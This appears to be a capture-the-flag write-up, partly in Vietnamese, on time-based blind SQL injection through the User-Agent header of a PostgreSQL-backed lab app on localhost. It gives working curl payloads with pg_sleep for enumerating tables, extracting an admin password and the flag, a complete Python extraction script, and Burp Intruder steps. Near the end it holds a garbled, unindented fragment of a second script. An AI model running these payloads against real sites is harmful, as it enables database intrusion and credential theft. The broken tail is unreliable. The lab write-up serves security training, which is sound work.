# SQLi-034: PostgreSQL User-Agent Time-based - Writeup

## Flag: `FLAG{us3r_4g3nt_t1m3_bl1nd}`

---

## 🔍 Bước 1: DETECT

**Injection Point:** HTTP Header `User-Agent`

```bash
# Normal request - fast response
curl -A "Mozilla/5.0" http://localhost:5034/

# Test Time-based SQLi trong User-Agent (INSERT context)
curl -A "Mozilla'); SELECT pg_sleep(5)--" http://localhost:5034/
```

→ Response chậm ~5s = **User-Agent SQLi confirmed!**

**⚠️ Context:** Ứng dụng log User-Agent vào database bằng INSERT statement:

```sql
INSERT INTO visitors (user_agent, ip_address) VALUES ('User-Agent', '...')
```

→ Injection point: `'); PAYLOAD--`

---

## 🎯 Bước 2: IDENTIFY DATABASE

```bash
# Check database name
curl -A "x'); SELECT CASE WHEN (current_database()='postgres') THEN pg_sleep(3) END--" http://localhost:5034/
# ~3s delay → database = 'postgres'
```

→ Database: **postgres**

---

## 🔢 Bước 3: ENUMERATE TABLES

### 3.1. Đếm số bảng

```bash
curl -A "x'); SELECT CASE WHEN ((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public')=3) THEN pg_sleep(5) END--" http://localhost:5034/
```

→ ~5s delay → Có **3 bảng**

### 3.2. Lấy tên bảng

**Bảng 1:**

```bash
curl -A "x'); SELECT CASE WHEN (SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 0),1,1)='§a§') THEN pg_sleep(5) END--" http://localhost:5034/
```

**Kết quả:**

- admin_creds
- flags
- visitors

---

## 🗂️ Bước 4: ENUMERATE COLUMNS

**Columns của bảng `flags`:**

```bash
curl -A "x'); SELECT CASE WHEN (SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='flags' LIMIT 1 OFFSET 0),1,1)='§i§') THEN pg_sleep(5) END--" http://localhost:5034/
```

**Kết quả:**

- id
- name
- value

---

## 📤 Bước 5: EXTRACT PASSWORD

```bash
curl -A "x'); SELECT CASE WHEN (SUBSTRING((SELECT password FROM admin_creds LIMIT 1 OFFSET 0),1,1)='§U§') THEN pg_sleep(5) END--" http://localhost:5034/
```

**Credentials:**

- ua_admin : Us3r_Ag3nt_Adm1n!

---

## 🏆 Bước 6: EXFILTRATE FLAG

```bash
curl -A "x'); SELECT CASE WHEN (SUBSTRING((SELECT value FROM flags WHERE name='sqli_034'),1,1)='§F§') THEN pg_sleep(5) END--" http://localhost:5034/
```

🎉 **FLAG:** `FLAG{us3r_4g3nt_t1m3_bl1nd}`

---

## 🤖 Exploit Script

```python
import requests
import time

URL = "http://localhost:5034/"
DELAY = 3
THRESHOLD = 2.5

def check(condition):
    start = time.time()
    # Injection in User-Agent (INSERT context - close quote and parenthesis)
    ua_value = f"x'); SELECT CASE WHEN ({condition}) THEN pg_sleep({DELAY}) END--"
    try:
        r = requests.get(URL, headers={"User-Agent": ua_value}, timeout=10)
        elapsed = time.time() - start
        return elapsed > THRESHOLD
    except:
        return False

def extract_string(query, max_len=100):
    result = ""
    charset = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_{}-@!#$%^&*()"

    for pos in range(1, max_len + 1):
        found = False
        for char in charset:
            condition = f"SUBSTRING(({query}),{pos},1)='{char}'"
            print(f"[*] Position {pos}: '{char}'...", end='\r')

            if check(condition):
                result += char
                print(f"[+] Found: {result}                    ")
                found = True
                break

        if not found:
            break

    return result

# Extract flag
print("[*] Extracting flag...")
flag_query = "SELECT value FROM flags WHERE name='sqli_034'"
flag = extract_string(flag_query, max_len=40)
print(f"\n🎉 FLAG: {flag}")
```

---

## 🔑 User-Agent Injection Key Points

| Aspect          | Details                                            |
| --------------- | -------------------------------------------------- |
| Injection Point | HTTP User-Agent header                             |
| Detection       | Set malicious UA: `curl -A "payload"`              |
| Context         | Usually **INSERT INTO visitors (user_agent, ...)** |
| Payload prefix  | `'); ` (close quote + close parenthesis)           |
| Payload suffix  | `--` (comment out rest of query)                   |

**⚠️ Common SQL Context:**

```sql
-- Original query
INSERT INTO visitors (user_agent, ip_address) VALUES ('Mozilla/5.0', '...')

-- Injected
INSERT INTO visitors (user_agent, ip_address) VALUES ('x'); SELECT pg_sleep(5)--', '...')
```

**Burp Intruder User-Agent Injection:**

1. Intercept request
2. Right-click User-Agent header → "Send to Intruder"
3. Mark injection point: `User-Agent: x'); SELECT CASE WHEN (condition) THEN pg_sleep(5) END§§--`
4. Attack!

**Other injectable HTTP headers:**

- `Referer`
- `X-Forwarded-For`
- `Cookie`
- `Authorization`
- Custom headers như `X-API-Key`
  start = time.time()
  ua = f"Mozilla'); SELECT CASE WHEN ({cond}) THEN pg_sleep(2) END--"
  requests.get("http://localhost:5034/", headers={"User-Agent": ua})
  return time.time() - start > 1.5

flag = ""
for pos in range(1, 30):
for c in "FLAG{}\_0123456789abcdefghijklmnopqrstuvwxyz":
if check(f"(SELECT SUBSTRING(value,{pos},1) FROM flags)='{c}'"):
flag += c
print(f"[+] {flag}")
break

```

🎉 **FLAG:** `FLAG{us3r_4g3nt_t1m3_bl1nd}`
```
